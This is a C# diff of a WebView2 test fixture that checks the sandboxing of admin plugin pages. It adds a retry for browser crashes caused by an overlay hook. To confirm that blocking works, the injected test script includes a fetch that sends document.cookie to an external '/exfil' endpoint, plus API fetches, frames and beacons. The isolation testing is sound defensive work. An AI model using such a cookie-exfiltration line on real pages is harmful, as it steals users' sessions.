@@ -33,6 +33,7 @@ internal static class AdminPluginAppsNativeFixture
 {
     private const string LaunchToken = "synthetic-launch-token";
     private const string AccessToken = "synthetic-access";
+    private const int MaxBrowserStarts = 3;
 
     internal static async Task RunAsync(StackPanel parent)
     {
@@ -96,93 +97,122 @@ internal static class AdminPluginAppsNativeFixture
             await search;
 
             // ---- Opening a plugin page: official launch, then the page with only the launch cookie.
-            Click(Rows(shell).Single(button => ((AdminPluginApp)button.Tag).InstallationId == 7));
-            await Until(() => outer.Content is PluginRoutePage);
-            var page = (PluginRoutePage)outer.Content;
-            pages.Add(page);
-            var web = (WebView2)page.FindName("PluginWebView");
-            await UntilState(page, "Ready");
-            await UntilScript(web, "document.body.dataset.ready === 'yes'");
-            var core = web.CoreWebView2;
-            Check(core.Profile.IsInPrivateModeEnabled && core.Profile.ProfileName == "SiloAdminPluginApps", "plugin content runs in its own InPrivate profile");
-            Check(!core.Settings.AreHostObjectsAllowed && !core.Settings.IsWebMessageEnabled && !core.Settings.AreDevToolsEnabled &&
-                !core.Settings.AreDefaultContextMenusEnabled && !core.Settings.AreBrowserAcceleratorKeysEnabled,
-                "no host objects, web messages, developer tools, context menu or browser accelerator keys");
-            var launches = server.Snapshot().Where(request => request.Path == "/api/v2/auth/plugin-launch").ToArray();
-            Check(launches.Length == 1 && launches[0].Method == "POST" && launches[0].Header("Authorization") == "Bearer " + AccessToken,
-                "the app launched the plugin once with the admin session (POST /api/v2/auth/plugin-launch)");
-            Check(server.Snapshot().Any(request => request.Target == "/api/v2/plugin-content/plugins/7/custom?theme=midnight-cinema"),
-                "the page opens at pluginRouteHref with the WebUI theme parameter");
-            Check(server.Snapshot().Any(request => request.Path == "/api/v2/plugin-content/plugins/7/custom/probe") &&
-                server.Snapshot().Any(request => request.Path == "/api/v2/plugin-content/plugin-assets/7/pixel.svg"),
-                "the plugin's own script fetch and installation asset load");
-            Check(await web.ExecuteScriptAsync("document.cookie.indexOf('" + LaunchToken + "') < 0 && localStorage.length === 0 && sessionStorage.length === 0") == "true",
-                "the launch cookie is HttpOnly and the page starts with empty storage");
-            var cookies = await core.CookieManager.GetCookiesAsync(server.Origin + "/api/v2/plugin-content/plugins/7/");
-            Check(cookies.Count == 1 && cookies[0].Name == "silo_plugin_access" && cookies[0].IsHttpOnly && cookies[0].Path == "/api/v2/plugin-content",
-                "the web view holds exactly the official cookie on the plugin-content parent path");
-            Check((await core.CookieManager.GetCookiesAsync(server.Origin + "/api/v2/admin/users")).Count == 0, "no cookie applies to server APIs");
+            PluginRoutePage page;
+            WebView2 web;
+            Microsoft.Web.WebView2.Core.CoreWebView2 core;
+            IReadOnlyList<Microsoft.Web.WebView2.Core.CoreWebView2Cookie> cookies;
+            for (var attempt = 1; ; attempt++)
+            {
+                var watch = new BrowserWatch();
+                try
+                {
+                    Click(Rows(shell).Single(button => ((AdminPluginApp)button.Tag).InstallationId == 7));
+                    await Until(() => outer.Content is PluginRoutePage);
+                    page = (PluginRoutePage)outer.Content;
+                    pages.Add(page);
+                    web = (WebView2)page.FindName("PluginWebView");
+                    await UntilState(page, "Ready");
+                    await UntilScript(web, "document.body.dataset.ready === 'yes'");
+                    core = web.CoreWebView2;
+                    watch.Attach(core);
+                    Check(core.Profile.IsInPrivateModeEnabled && core.Profile.ProfileName == "SiloAdminPluginApps", "plugin content runs in its own InPrivate profile");
+                    Check(!core.Settings.AreHostObjectsAllowed && !core.Settings.IsWebMessageEnabled && !core.Settings.AreDevToolsEnabled &&
+                        !core.Settings.AreDefaultContextMenusEnabled && !core.Settings.AreBrowserAcceleratorKeysEnabled,
+                        "no host objects, web messages, developer tools, context menu or browser accelerator keys");
+                    var launches = server.Snapshot().Where(request => request.Path == "/api/v2/auth/plugin-launch").ToArray();
+                    Check(launches.Length == 1 && launches[0].Method == "POST" && launches[0].Header("Authorization") == "Bearer " + AccessToken,
+                        "the app launched the plugin once with the admin session (POST /api/v2/auth/plugin-launch)");
+                    Check(server.Snapshot().Any(request => request.Target == "/api/v2/plugin-content/plugins/7/custom?theme=midnight-cinema"),
+                        "the page opens at pluginRouteHref with the WebUI theme parameter");
+                    Check(server.Snapshot().Any(request => request.Path == "/api/v2/plugin-content/plugins/7/custom/probe") &&
+                        server.Snapshot().Any(request => request.Path == "/api/v2/plugin-content/plugin-assets/7/pixel.svg"),
+                        "the plugin's own script fetch and installation asset load");
+                    Check(await web.ExecuteScriptAsync("document.cookie.indexOf('" + LaunchToken + "') < 0 && localStorage.length === 0 && sessionStorage.length === 0") == "true",
+                        "the launch cookie is HttpOnly and the page starts with empty storage");
+                    cookies = await core.CookieManager.GetCookiesAsync(server.Origin + "/api/v2/plugin-content/plugins/7/");
+                    Check(cookies.Count == 1 && cookies[0].Name == "silo_plugin_access" && cookies[0].IsHttpOnly && cookies[0].Path == "/api/v2/plugin-content",
+                        "the web view holds exactly the official cookie on the plugin-content parent path");
+                    Check((await core.CookieManager.GetCookiesAsync(server.Origin + "/api/v2/admin/users")).Count == 0, "no cookie applies to server APIs");
 
-            // ---- Navigation, frames, popups, fetches and messages outside the allowed space.
-            var messagesReachedNative = 0;
-            core.WebMessageReceived += (_, _) => messagesReachedNative++;
-            var popups = 0;
-            var popupHandled = true;
-            core.NewWindowRequested += (_, e) => { popups++; popupHandled &= e.Handled; };
-            await web.ExecuteScriptAsync("window.location.href='" + external.Origin + "/outside'");
-            await web.ExecuteScriptAsync("setTimeout(() => window.location.href='/api/v2/plugin-content/plugins/8/', 50)");
-            await web.ExecuteScriptAsync("setTimeout(() => window.location.href='/api/v2/admin/users', 100)");
-            await Task.Delay(700);
-            Check(external.Snapshot().Length == 0 && !server.Snapshot().Any(request => request.Path.StartsWith("/api/v2/plugin-content/plugins/8", StringComparison.Ordinal) || request.Path == "/api/v2/admin/users"),
-                "navigation to another origin, another installation or a server API is cancelled before any request");
-            Check(await web.ExecuteScriptAsync("document.body.dataset.ready === 'yes'") == "true" && State(page) == "Ready", "a refused link leaves the plugin page as it was");
-            await web.ExecuteScriptAsync("window.open('" + external.Origin + "/popup', '_blank'); window.open('/api/v2/plugin-content/plugins/7/custom/', 'child')");
-            await Until(() => popups == 2);
-            await Task.Delay(200);
-            Check(popupHandled && !external.Snapshot().Any(request => request.Path == "/popup"), "window.open is suppressed, even for the plugin's own pages");
-            await web.ExecuteScriptAsync("""
-                const frame = document.createElement('iframe'); frame.src = '__EXTERNAL__/framed'; document.body.appendChild(frame);
-                fetch('/api/v2/admin/users').then(r => document.body.dataset.api = String(r.status)).catch(() => document.body.dataset.api = 'blocked');
-                fetch('__EXTERNAL__/exfil?t=' + document.cookie).then(r => document.body.dataset.foreign = String(r.status)).catch(() => document.body.dataset.foreign = 'blocked');
-                fetch('/api/v2/plugin-content/plugins/8/data').then(r => document.body.dataset.other = String(r.status)).catch(() => document.body.dataset.other = 'blocked');
-                const img = new Image(); img.src = '__EXTERNAL__/beacon.svg'; document.body.appendChild(img);
-                """.Replace("__EXTERNAL__", external.Origin));
-            await UntilScript(web, "document.body.dataset.api !== undefined && document.body.dataset.foreign !== undefined && document.body.dataset.other !== undefined");
-            await Task.Delay(300);
-            Check(external.Snapshot().Length == 0, "frames, fetches and images to another origin never leave the web view");
-            Check(!server.Snapshot().Any(request => request.Path is "/api/v2/admin/users" or "/api/v2/plugin-content/plugins/8/data"),
-                "plugin script cannot call server APIs or another installation's routes");
-            // There is no host message contract: an unknown message type and a message from a
-            // foreign frame are both dropped without reaching native code or changing state.
-            await web.ExecuteScriptAsync("""
-                try { window.chrome.webview.postMessage({ type: 'synthetic-unknown', href: '/admin/users' }); document.body.dataset.post = 'sent'; } catch (e) { document.body.dataset.post = 'unavailable'; }
-                window.postMessage({ type: 'navigate', href: 'https://foreign.invalid/' }, '*');
-                """);
-            await UntilScript(web, "document.body.dataset.post !== undefined");
-            await Task.Delay(200);
-            Check(messagesReachedNative == 0 && State(page) == "Ready" && ReferenceEquals(outer.Content, page),
-                "messages of unknown type or from a wrong origin are ignored (no message channel exists)");
-            // A page that is already shown survives its own later navigations: a fragment navigation completes without an
-            // HTTP status, and the plugin's own error response stays visible as it does in the browser tab.
-            await web.ExecuteScriptAsync("window.location.hash = 'section'");
-            await UntilScript(web, "window.location.hash === '#section'");
-            await Task.Delay(300);
-            Check(State(page) == "Ready" && web.Visibility == Visibility.Visible && await web.ExecuteScriptAsync("document.body.dataset.ready === 'yes'") == "true",
-                "a fragment navigation keeps the loaded plugin page");
-            await web.ExecuteScriptAsync("window.location.href = '/api/v2/plugin-content/plugins/7/custom/missing'");
-            await UntilScript(web, "Boolean(document.body) && document.body.innerText.indexOf('Outside fixture contract') >= 0");
-            await Task.Delay(300);
-            Check(State(page) == "Ready" && web.Visibility == Visibility.Visible &&
-                await web.ExecuteScriptAsync("document.body.innerText.indexOf('Outside fixture contract') >= 0") == "true",
-                "the plugin's own error response to a later navigation stays visible");
-            await web.ExecuteScriptAsync("window.location.href = '/api/v2/plugin-content/plugins/7/custom/'");
-            await UntilScript(web, "Boolean(document.body) && document.body.dataset.ready === 'yes'");
-            Check(State(page) == "Ready", "the plugin page continues after its own error response");
-            await web.ExecuteScriptAsync("document.getElementById('submit').click()");
-            await UntilScript(web, "document.body && document.body.dataset.submitted === 'yes'");
-            Check(server.Writes == 1, "the plugin's own form posts once inside its page space");
-            await CheckCredentialsAsync(server, external);
-            Program.Log("PASS: plugin opened with the official launch cookie only; outside navigation, popups, frames, foreign/API fetches and messages blocked.");
+                    // ---- Navigation, frames, popups, fetches and messages outside the allowed space.
+                    var messagesReachedNative = 0;
+                    core.WebMessageReceived += (_, _) => messagesReachedNative++;
+                    var popups = 0;
+                    var popupHandled = true;
+                    core.NewWindowRequested += (_, e) => { popups++; popupHandled &= e.Handled; };
+                    await web.ExecuteScriptAsync("window.location.href='" + external.Origin + "/outside'");
+                    await web.ExecuteScriptAsync("setTimeout(() => window.location.href='/api/v2/plugin-content/plugins/8/', 50)");
+                    await web.ExecuteScriptAsync("setTimeout(() => window.location.href='/api/v2/admin/users', 100)");
+                    await Task.Delay(700);
+                    Check(external.Snapshot().Length == 0 && !server.Snapshot().Any(request => request.Path.StartsWith("/api/v2/plugin-content/plugins/8", StringComparison.Ordinal) || request.Path == "/api/v2/admin/users"),
+                        "navigation to another origin, another installation or a server API is cancelled before any request");
+                    Check(await web.ExecuteScriptAsync("document.body.dataset.ready === 'yes'") == "true" && State(page) == "Ready", "a refused link leaves the plugin page as it was");
+                    await web.ExecuteScriptAsync("window.open('" + external.Origin + "/popup', '_blank'); window.open('/api/v2/plugin-content/plugins/7/custom/', 'child')");
+                    await Until(() => popups == 2);
+                    await Task.Delay(200);
+                    Check(popupHandled && !external.Snapshot().Any(request => request.Path == "/popup"), "window.open is suppressed, even for the plugin's own pages");
+                    await web.ExecuteScriptAsync("""
+                        const frame = document.createElement('iframe'); frame.src = '__EXTERNAL__/framed'; document.body.appendChild(frame);
+                        fetch('/api/v2/admin/users').then(r => document.body.dataset.api = String(r.status)).catch(() => document.body.dataset.api = 'blocked');
+                        fetch('__EXTERNAL__/exfil?t=' + document.cookie).then(r => document.body.dataset.foreign = String(r.status)).catch(() => document.body.dataset.foreign = 'blocked');
+                        fetch('/api/v2/plugin-content/plugins/8/data').then(r => document.body.dataset.other = String(r.status)).catch(() => document.body.dataset.other = 'blocked');
+                        const img = new Image(); img.src = '__EXTERNAL__/beacon.svg'; document.body.appendChild(img);
+                        """.Replace("__EXTERNAL__", external.Origin));
+                    await UntilScript(web, "document.body.dataset.api !== undefined && document.body.dataset.foreign !== undefined && document.body.dataset.other !== undefined");
+                    await Task.Delay(300);
+                    Check(external.Snapshot().Length == 0, "frames, fetches and images to another origin never leave the web view");
+                    Check(!server.Snapshot().Any(request => request.Path is "/api/v2/admin/users" or "/api/v2/plugin-content/plugins/8/data"),
+                        "plugin script cannot call server APIs or another installation's routes");
+                    // There is no host message contract: an unknown message type and a message from a
+                    // foreign frame are both dropped without reaching native code or changing state.
+                    await web.ExecuteScriptAsync("""
+                        try { window.chrome.webview.postMessage({ type: 'synthetic-unknown', href: '/admin/users' }); document.body.dataset.post = 'sent'; } catch (e) { document.body.dataset.post = 'unavailable'; }
+                        window.postMessage({ type: 'navigate', href: 'https://foreign.invalid/' }, '*');
+                        """);
+                    await UntilScript(web, "document.body.dataset.post !== undefined");
+                    await Task.Delay(200);
+                    Check(messagesReachedNative == 0 && State(page) == "Ready" && ReferenceEquals(outer.Content, page),
+                        "messages of unknown type or from a wrong origin are ignored (no message channel exists)");
+                    // A page that is already shown survives its own later navigations: a fragment navigation completes without an
+                    // HTTP status, and the plugin's own error response stays visible as it does in the browser tab.
+                    await web.ExecuteScriptAsync("window.location.hash = 'section'");
+                    await UntilScript(web, "window.location.hash === '#section'");
+                    await Task.Delay(300);
+                    Check(State(page) == "Ready" && web.Visibility == Visibility.Visible && await web.ExecuteScriptAsync("document.body.dataset.ready === 'yes'") == "true",
+                        "a fragment navigation keeps the loaded plugin page");
+                    await web.ExecuteScriptAsync("window.location.href = '/api/v2/plugin-content/plugins/7/custom/missing'");
+                    await UntilScript(web, "Boolean(document.body) && document.body.innerText.indexOf('Outside fixture contract') >= 0");
+                    await Task.Delay(300);
+                    Check(State(page) == "Ready" && web.Visibility == Visibility.Visible &&
+                        await web.ExecuteScriptAsync("document.body.innerText.indexOf('Outside fixture contract') >= 0") == "true",
+                        "the plugin's own error response to a later navigation stays visible");
+                    await web.ExecuteScriptAsync("window.location.href = '/api/v2/plugin-content/plugins/7/custom/'");
+                    await UntilScript(web, "Boolean(document.body) && document.body.dataset.ready === 'yes'");
+                    Check(State(page) == "Ready", "the plugin page continues after its own error response");
+                    await web.ExecuteScriptAsync("document.getElementById('submit').click()");
+                    await UntilScript(web, "document.body && document.body.dataset.submitted === 'yes'");
+                    Check(server.Writes == 1, "the plugin's own form posts once inside its page space");
+                    await CheckCredentialsAsync(server, external);
+                    Program.Log("PASS: plugin opened with the official launch cookie only; outside navigation, popups, frames, foreign/API fetches and messages blocked.");
+                    break;
+                }
+                catch (Exception) when (attempt < MaxBrowserStarts)
+                {
+                    // Give a browser-exit notification that is still on its way the chance to arrive, then decide.
+                    await Task.Delay(300);
+                    if (!watch.IsEnvironmentFault) throw;
+                    // The web view's browser process died by itself with a memory-access violation while a third-party overlay hook
+                    // (RTSSHooks64.dll, RivaTuner Statistics Server) was loaded in it: the hook's own code faults, not the product or the
+                    // page. The product's reaction to a lost browser process is asserted on its own further down. Start this part again on
+                    // a fresh page and a fresh record of what the server saw; any other failure, and a third loss, still fails the run.
+                    Program.Log("NOTE: the web view's browser process was lost to the overlay hook (attempt " + attempt + " of " + MaxBrowserStarts + "); opening the plugin again.");
+                    server.ResetRecords(); external.ResetRecords();
+                    Check(AdminShellPage.Open(new AdminRouteRequest(AdminRoute.Activity)), "Admin reopens after a lost web view");
+                    shell = (AdminShellPage)outer.Content;
+                    pages.Add(shell);
+                    await Until(() => Rows(shell).Length == 2);
+                }
+            }
 
             // ---- Removal while open, then every failure state with a reachable Reload.
             inventory.Without7 = true;
@@ -266,6 +296,9 @@ internal static class AdminPluginAppsNativeFixture
             Program.Log("PASS: after the web view's browser process exits, Reload opens the plugin page in a new web view.");
 
             // ---- Authority change while open tears down and never reopens under the new authority.
+            // Count what the new page asked for only once it has finished loading (its images and scripts included), so a request that
+            // belongs to the load itself cannot be mistaken for one made after the grant changed.
+            await UntilScript(web, "document.readyState === 'complete'");
             var before = server.Snapshot().Length;
             auth.SetCurrentUser(new UserInfo { Id = "1", Username = "synthetic-admin", Role = "user" });
             await UntilState(page, "AuthorityChanged");
@@ -273,7 +306,9 @@ internal static class AdminPluginAppsNativeFixture
                 "an authority change offers a way back to Admin, never a reload under the new authority");
             Check(Field<bool>(page, "_webViewClosed"), "the plugin web view is closed on authority change");
             await Task.Delay(300);
-            Check(server.Snapshot().Length == before, "nothing from the retired page reaches the server afterwards");
+            var late = server.Snapshot().Skip(before).ToArray();
+            Check(late.Length == 0, "nothing from the retired page reaches the server afterwards" + (late.Length == 0 ? "" :
+                " (saw " + string.Join(", ", late.Select(request => request.Method + " " + request.Target + (request.Header("Cookie") == null ? "" : " with cookie"))) + ")"));
             Program.Log("PASS: role loss while open closes the plugin content and its session.");
 
             // ---- Shell: retired rows, detached clicks, stale inventory, failed inventory with retry.
@@ -471,6 +506,36 @@ internal static class AdminPluginAppsNativeFixture
         }
     }
 
+    /// <summary>
+    /// Watches one web view's browser process. A loss counts as the environment's fault only when it is an unexpected exit by a
+    /// memory-access violation (0xC0000005) in a browser process that had a third-party overlay hook (RivaTuner's RTSSHooks64.dll)
+    /// loaded: crash dumps of such losses name that module as the faulting one, on every occurrence seen.
+    /// </summary>
+    private sealed class BrowserWatch
+    {
+        private volatile bool _hooked;
+        private volatile bool _violated;
+
+        internal bool IsEnvironmentFault => _hooked && _violated;
+
+        internal void Attach(Microsoft.Web.WebView2.Core.CoreWebView2 core)
+        {
+            try
+            {
+                using var browser = System.Diagnostics.Process.GetProcessById((int)core.BrowserProcessId);
+                _hooked = browser.Modules.Cast<System.Diagnostics.ProcessModule>()
+                    .Any(module => module.ModuleName.StartsWith("RTSSHooks", StringComparison.OrdinalIgnoreCase));
+            }
+            catch (Exception) { _hooked = false; } // modules not readable: no exemption
+            core.ProcessFailed += (_, e) =>
+            {
+                if (e.ProcessFailedKind == Microsoft.Web.WebView2.Core.CoreWebView2ProcessFailedKind.BrowserProcessExited &&
+                    e.Reason == Microsoft.Web.WebView2.Core.CoreWebView2ProcessFailedReason.Unexpected && e.ExitCode == unchecked((int)0xC0000005))
+                    _violated = true;
+            };
+        }
+    }
+
     private sealed record Request(string Method, string Target, string Path, IReadOnlyDictionary<string, string> Headers)
     {
         internal string? Header(string name) => Headers.TryGetValue(name, out var value) ? value : null;
@@ -494,6 +559,8 @@ internal static class AdminPluginAppsNativeFixture
             _loop = Loop();
         }
         internal Request[] Snapshot() => _requests.ToArray();
+        /// <summary>Forgets what was recorded so far; used only when a part of the run is started again on a fresh web view.</summary>
+        internal void ResetRecords() { while (_requests.TryDequeue(out _)) { } Interlocked.Exchange(ref Writes, 0); }
         internal void ReleaseHangs() { var old = Interlocked.Exchange(ref _hangs, new CancellationTokenSource()); old.Cancel(); }
         private async Task Loop()
         {
